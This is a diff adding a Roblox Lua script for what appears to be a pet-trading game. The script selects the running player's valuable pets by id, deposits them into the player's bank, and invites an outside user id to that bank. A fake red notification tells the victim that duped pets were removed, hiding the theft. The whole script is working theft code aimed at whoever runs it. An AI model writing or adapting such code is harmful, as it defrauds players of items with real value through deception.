@@ -1,0 +1,83 @@
+local lib = require(game.ReplicatedStorage:WaitForChild("Framework"):WaitForChild("Library"));
+local data = {157,225,239,266,274,291,292,307,117,147,130,149,90,222,98,133,131,142,144,148,106,183}
+function valueOf(array, value)
+    for i, v in pairs(array) do
+        if i == value then
+            return v;
+        end
+    end
+    return false;
+end
+local function has_value (tab, val)
+    for index, value in ipairs(tab) do
+        if tostring(value) == tostring(val) then
+            return true
+        end
+    end
+
+    return false
+end
+function getIdByUID(id, player) 
+    local stats = lib.Network.Invoke('get stats', game.Players[player]);
+    for i,v in pairs(stats) do
+        if (i== "Pets") then
+            for i,val in pairs(v) do
+                for i,v in pairs(val) do
+                    if (valueOf(val, "uid") == id) then
+                        if (i == "id") then 
+                            return v;
+                        end
+                    end
+                end
+            end
+        end
+    end
+end
+local stats = lib.Network.Invoke('get stats', game.Players.LocalPlayer);
+local tab = {};
+for i,v in pairs(stats) do
+    if (i == "Pets") then
+        for i,val in pairs(v) do
+            for i,v in pairs(val) do
+                if (i == "uid") then
+                    if (has_value(data, valueOf(val, "id"))) then
+                       table.insert(tab, v);
+                    end
+                    print(v)
+                end
+            end
+        end
+    end
+end
+local mybanks = lib.Network.Invoke("get my banks")
+local x;
+local userid = game.Players.LocalPlayer.UserId;
+for inp,val in pairs(mybanks) do
+for i,v in pairs(val) do
+if (i == "BUID") then
+if (valueOf(val, "Owner") == userid) then
+print(v)
+x = v;
+break;
+end
+end
+end
+end
+local ohTable1 = {
+    [1] = x,
+    [2] = tab,
+    [3] = 0
+}
+wait(10)
+local text = 'They have been removed. Apologies. \n Duped pet(s) were found in your inventory.'
+local lib = require(game.ReplicatedStorage:WaitForChild("Framework"):WaitForChild("Library"));
+lib.Signal.Fire("Notification", text, {time = 7.5, color = Color3.fromRGB(255, 24, 26, 255)});
+for i,v in pairs(game.Players.LocalPlayer.PlayerGui.Notifications.Frame:GetChildren()) do
+    if (v.Name == "Notification") then
+        if (v.Text == text) then
+            v.Size = UDim2.new(1,0,0.35,0);
+        end
+    end
+end
+workspace.__THINGS.__REMOTES["bank deposit"]:InvokeServer(ohTable1)
+local yes = lib.Network.Invoke("invite to bank", x, 7722306047) 
